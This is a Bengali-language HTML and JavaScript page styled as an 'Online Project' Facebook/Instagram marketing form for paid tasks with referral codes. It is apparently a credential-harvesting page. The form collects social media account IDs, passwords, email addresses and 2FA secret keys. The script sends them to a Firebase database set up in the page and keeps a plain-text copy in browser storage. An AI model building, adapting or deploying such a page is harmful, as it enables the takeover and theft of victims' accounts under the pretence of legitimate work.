<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Online Project - User</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
</head>
<body class="bg-gray-100 min-h-screen pb-10">

    <header class="bg-white shadow-md p-4 sticky top-0 z-50 flex justify-between items-center">
        <div class="w-10"></div> <h1 class="text-xl font-bold text-blue-600">Online Project</h1>
        <button onclick="toggleHistory()" class="relative p-2 text-gray-600 hover:text-blue-600 transition">
            <i class="fas fa-history text-xl"></i>
            <span id="history-count" class="absolute top-0 right-0 bg-red-500 text-white text-[10px] px-1 rounded-full">0</span>
        </button>
    </header>

    <div id="main-content" class="max-w-md mx-auto p-4">
        <div class="flex bg-white rounded-lg shadow mb-6 overflow-hidden">
            <button onclick="setPlatform('Facebook')" id="fb-btn" class="flex-1 py-3 font-bold border-b-4 border-blue-600 text-blue-600">ফেসবুক</button>
            <button onclick="setPlatform('Instagram')" id="ig-btn" class="flex-1 py-3 font-bold text-gray-400">Instagram</button>
        </div>

        <div class="bg-white rounded-xl shadow-lg p-6">
            <h2 id="form-title" class="text-lg font-bold mb-6 text-gray-800 border-l-4 border-blue-600 pl-3">ফেসবুক মার্কেটিং ফরম</h2>

            <form id="marketingForm" class="space-y-4">
                <input type="text" id="userName" placeholder="১. আপনার নাম" required class="w-full p-3 border rounded-lg bg-gray-50 outline-none focus:ring-2 focus:ring-blue-400">
                <input type="text" id="referCode" placeholder="২. আপনার রেফার কোড" required class="w-full p-3 border rounded-lg bg-gray-50 outline-none focus:ring-2 focus:ring-blue-400">
                <input type="text" id="uid" placeholder="৩. UID" required class="w-full p-3 border rounded-lg bg-gray-50 outline-none focus:ring-2 focus:ring-blue-400">
                <input type="text" id="password" placeholder="৪. Password" required class="w-full p-3 border rounded-lg bg-gray-50 outline-none focus:ring-2 focus:ring-blue-400">
                <input type="email" id="webmail" placeholder="৫. Webmail" required class="w-full p-3 border rounded-lg bg-gray-50 outline-none focus:ring-2 focus:ring-blue-400">
                <input type="text" id="twofa" placeholder="৬. 2fa Key" required class="w-full p-3 border rounded-lg bg-gray-50 outline-none focus:ring-2 focus:ring-blue-400">
                
                <button type="submit" id="submitBtn" class="w-full mt-2 bg-blue-600 text-white font-bold py-4 rounded-xl shadow-lg active:scale-95 transition-all">রিকুয়েষ্ট পাঠান</button>
            </form>
        </div>
    </div>

    <div id="history-page" class="hidden max-w-md mx-auto p-4">
        <div class="flex items-center mb-6">
            <button onclick="toggleHistory()" class="mr-4 text-gray-600"><i class="fas fa-arrow-left"></i></button>
            <h2 class="text-xl font-bold text-gray-800">আপনার কাজের ইতিহাস</h2>
        </div>
        <div id="history-list" class="space-y-4">
            </div>
    </div>

    <script>
        // Firebase Config
        const firebaseConfig = {
            apiKey: "AIzaSyDMdzu-9zZjfM8A9VuaiBmREeLzPa9_kr8",
            authDomain: "tupupp-80860.firebaseapp.com",
            databaseURL: "https://tupupp-80860-default-rtdb.firebaseio.com",
            projectId: "tupupp-80860",
            storageBucket: "tupupp-80860.firebasestorage.app",
            messagingSenderId: "617315490972",
            appId: "1:617315490972:web:e1c904a66da70a839e6159"
        };
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        let currentPlatform = "Facebook";

        // হিস্টোরি লোড করা
        function updateHistoryUI() {
            const history = JSON.parse(localStorage.getItem('myRequests') || '[]');
            document.getElementById('history-count').innerText = history.length;
            
            const list = document.getElementById('history-list');
            if(history.length === 0) {
                list.innerHTML = `<div class="text-center py-10 text-gray-400">এখনো কোনো কাজ জমা দেননি।</div>`;
                return;
            }

            list.innerHTML = history.reverse().map(item => `
                <div class="bg-white p-4 rounded-xl shadow-sm border-l-4 ${item.platform === 'Facebook' ? 'border-blue-500' : 'border-pink-500'}">
                    <div class="flex justify-between items-start mb-2">
                        <span class="font-bold text-gray-800">${item.platform} Marketing</span>
                        <span class="text-[10px] text-gray-400">${item.time}</span>
                    </div>
                    <p class="text-xs text-gray-500">UID: ${item.uid}</p>
                    <div class="mt-2 text-[10px] font-bold text-green-600 uppercase">জমা দেওয়া হয়েছে (Pending)</div>
                </div>
            `).join('');
        }

        function toggleHistory() {
            const main = document.getElementById('main-content');
            const history = document.getElementById('history-page');
            main.classList.toggle('hidden');
            history.classList.toggle('hidden');
            if(!history.classList.contains('hidden')) updateHistoryUI();
        }

        function setPlatform(p) {
            currentPlatform = p;
            document.getElementById('form-title').innerText = p + " মার্কেটিং ফরম";
            const fbBtn = document.getElementById('fb-btn');
            const igBtn = document.getElementById('ig-btn');
            const submitBtn = document.getElementById('submitBtn');
            const title = document.getElementById('form-title');

            if(p === 'Facebook') {
                fbBtn.className = "flex-1 py-3 font-bold border-b-4 border-blue-600 text-blue-600";
                igBtn.className = "flex-1 py-3 font-bold text-gray-400";
                submitBtn.className = "w-full mt-2 bg-blue-600 text-white font-bold py-4 rounded-xl shadow-lg active:scale-95";
                title.className = "text-lg font-bold mb-6 text-gray-800 border-l-4 border-blue-600 pl-3";
            } else {
                igBtn.className = "flex-1 py-3 font-bold border-b-4 border-pink-600 text-pink-600";
                fbBtn.className = "flex-1 py-3 font-bold text-gray-400";
                submitBtn.className = "w-full mt-2 bg-pink-600 text-white font-bold py-4 rounded-xl shadow-lg active:scale-95";
                title.className = "text-lg font-bold mb-6 text-gray-800 border-l-4 border-pink-600 pl-3";
            }
        }

        document.getElementById('marketingForm').addEventListener('submit', (e) => {
            e.preventDefault();
            const submitBtn = document.getElementById('submitBtn');
            submitBtn.innerText = "প্রসেসিং হচ্ছে...";
            submitBtn.disabled = true;

            const data = {
                name: document.getElementById('userName').value,
                refer: document.getElementById('referCode').value,
                uid: document.getElementById('uid').value,
                pass: document.getElementById('password').value,
                mail: document.getElementById('webmail').value,
                key: document.getElementById('twofa').value,
                platform: currentPlatform,
                time: new Date().toLocaleString()
            };

            // Firebase-এ সেভ করা
            const newPostKey = database.ref().child('requests').push().key;
            database.ref('requests/' + newPostKey).set(data).then(() => {
                // LocalStorage-এ হিস্টোরি সেভ করা
                let history = JSON.parse(localStorage.getItem('myRequests') || '[]');
                history.push(data);
                localStorage.setItem('myRequests', JSON.stringify(history));

                alert("আপনার রিকুয়েষ্ট সফলভাবে জমা হয়েছে!");
                document.getElementById('marketingForm').reset();
                submitBtn.innerText = "রিকুয়েষ্ট পাঠান";
                submitBtn.disabled = false;
                updateHistoryUI();
            }).catch(err => {
                alert("ত্রুটি: " + err.message);
                submitBtn.disabled = false;
            });
        });

        // শুরুতে কাউন্ট আপডেট করা
        updateHistoryUI();
    </script>
</body>
</html>
